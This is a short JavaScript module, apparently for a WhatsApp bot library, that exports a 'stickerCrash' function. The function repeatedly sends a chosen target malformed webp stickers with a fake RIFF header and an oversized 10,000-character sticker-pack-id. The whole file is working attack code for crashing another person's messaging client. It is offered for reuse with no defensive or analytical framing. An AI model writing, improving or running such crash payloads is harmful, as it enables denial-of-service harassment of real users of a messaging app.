async function stickerCrash(sock, targetJid, opts = {}) {
  const rounds = opts.rounds || 3;
  for (let i = 0; i < rounds; i++) {
    try {
      await sock.sendMessage(targetJid, {
        sticker: Buffer.from('RIFF' + 'x'.repeat(2048)),   // broken webp
        mimetype: 'image/webp',
        stickerMetadata: { 'sticker-pack-id': 'x'.repeat(10000) }
      });
    } catch (e) { console.log(`[sticker] ${i + 1}: ${e.message}`); }
    await new Promise(r => setTimeout(r, 1500));
  }
}

module.exports = { stickerCrash, sticker: stickerCrash };
